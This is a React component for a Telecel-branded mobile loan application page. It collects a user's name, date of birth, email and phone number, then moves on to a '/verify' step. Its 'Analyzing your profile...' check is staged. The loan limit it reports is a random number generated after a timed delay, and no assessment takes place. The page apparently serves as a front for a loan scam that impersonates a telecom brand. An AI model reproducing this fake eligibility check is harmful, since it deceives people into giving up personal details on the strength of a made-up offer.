import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Slider } from "@/components/ui/slider";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import MobileShell from "@/components/MobileShell";

const LoanApply = () => {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    firstName: "",
    lastName: "",
    dob: "",
    email: "",
    phone: "",
  });
  const [modalOpen, setModalOpen] = useState(false);
  const [checking, setChecking] = useState(false);
  const [loanLimit, setLoanLimit] = useState(0);
  const [repayMonths, setRepayMonths] = useState(3);
  const [loanSaved, setLoanSaved] = useState(false);

  const handleChange = (field: string, value: string) => {
    setForm((prev) => ({ ...prev, [field]: value }));
  };

  const checkLoanLimit = () => {
    setModalOpen(true);
    setChecking(true);
    setLoanLimit(0);
    setTimeout(() => {
      const limit = Math.floor(Math.random() * (5000 - 100 + 1) + 100);
      setLoanLimit(Math.round(limit / 50) * 50);
      setChecking(false);
    }, 2500);
  };

  const interestRate = 0.12;
  const totalWithInterest = loanLimit + loanLimit * interestRate;
  const monthlyPayment = totalWithInterest / repayMonths;

  const saveLoanData = () => {
    const data = {
      ...form,
      loanAmount: loanLimit,
      repaymentMonths: repayMonths,
      interest: interestRate * 100,
      monthlyPayment: monthlyPayment.toFixed(2),
      totalRepayment: totalWithInterest.toFixed(2),
    };
    localStorage.setItem("telecel_loan", JSON.stringify(data));
    setLoanSaved(true);
    setModalOpen(false);
  };

  const canSubmit = form.firstName && form.lastName && form.dob && form.phone && loanSaved;

  const handleSubmit = () => {
    if (!canSubmit) return;
    navigate("/verify");
  };

  return (
    <MobileShell>
      <div className="telecel-gradient px-6 py-4 flex items-center gap-3">
        <button onClick={() => navigate("/")} className="text-primary-foreground">
          <ArrowLeft className="w-5 h-5" />
        </button>
        <h1 className="text-lg font-bold text-primary-foreground">Loan Application</h1>
      </div>

      <div className="flex-1 px-6 py-5 space-y-4 overflow-y-auto">
        <div className="grid grid-cols-2 gap-3">
          <div>
            <Label className="text-xs">First Name *</Label>
            <Input value={form.firstName} onChange={(e) => handleChange("firstName", e.target.value)} placeholder="John" className="mt-1" />
          </div>
          <div>
            <Label className="text-xs">Last Name *</Label>
            <Input value={form.lastName} onChange={(e) => handleChange("lastName", e.target.value)} placeholder="Doe" className="mt-1" />
          </div>
        </div>

        <div>
          <Label className="text-xs">Date of Birth *</Label>
          <Input type="date" value={form.dob} onChange={(e) => handleChange("dob", e.target.value)} className="mt-1" />
        </div>

        <div>
          <Label className="text-xs">Email (Optional)</Label>
          <Input type="email" value={form.email} onChange={(e) => handleChange("email", e.target.value)} placeholder="john@example.com" className="mt-1" />
        </div>

        <div>
          <Label className="text-xs">Telecel Phone Number *</Label>
          <Input value={form.phone} onChange={(e) => handleChange("phone", e.target.value)} placeholder="020XXXXXXX" className="mt-1" />
        </div>

        <Button onClick={checkLoanLimit} variant="outline" className="w-full h-11 border-primary text-primary hover:bg-primary hover:text-primary-foreground font-semibold rounded-xl">
          {loanSaved ? `Loan Limit: GHS ${loanLimit.toLocaleString()}` : "Check Loan Limit"}
        </Button>
      </div>

      <div className="px-6 pb-6">
        <Button onClick={handleSubmit} disabled={!canSubmit} className="w-full h-12 text-base font-semibold rounded-xl">
          Submit Application
        </Button>
      </div>

      {/* Loan Limit Modal */}
      <Dialog open={modalOpen} onOpenChange={setModalOpen}>
        <DialogContent className="max-w-[360px] rounded-2xl">
          <DialogHeader>
            <DialogTitle className="text-center">
              {checking ? "Checking Your Limit..." : "Your Loan Limit"}
            </DialogTitle>
          </DialogHeader>

          {checking ? (
            <div className="flex flex-col items-center py-8">
              <div className="relative w-20 h-20">
                <div className="absolute inset-0 rounded-full border-4 border-muted" />
                <div className="absolute inset-0 rounded-full border-4 border-primary border-t-transparent animate-spin-slow" />
              </div>
              <p className="text-sm text-muted-foreground mt-4">Analyzing your profile...</p>
            </div>
          ) : (
            <div className="space-y-5 py-2">
              <div className="text-center">
                <p className="text-sm text-muted-foreground">You qualify for up to</p>
                <p className="text-4xl font-bold text-primary mt-1">GHS {loanLimit.toLocaleString()}</p>
              </div>

              <div className="space-y-2">
                <div className="flex justify-between text-sm">
                  <span className="text-muted-foreground">Repayment Period</span>
                  <span className="font-semibold">{repayMonths} month{repayMonths > 1 ? "s" : ""}</span>
                </div>
                <Slider value={[repayMonths]} onValueChange={(v) => setRepayMonths(v[0])} min={1} max={6} step={1} className="py-2" />
                <div className="flex justify-between text-xs text-muted-foreground">
                  <span>1 month</span>
                  <span>6 months</span>
                </div>
              </div>

              <div className="bg-accent/50 rounded-xl p-3 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Interest Rate</span>
                  <span className="font-medium">12%</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Total Repayment</span>
                  <span className="font-medium">GHS {totalWithInterest.toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Monthly Payment</span>
                  <span className="font-bold text-primary">GHS {monthlyPayment.toFixed(2)}</span>
                </div>
              </div>

              <Button onClick={saveLoanData} className="w-full h-11 rounded-xl font-semibold">
                Continue
              </Button>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </MobileShell>
  );
};

export default LoanApply;
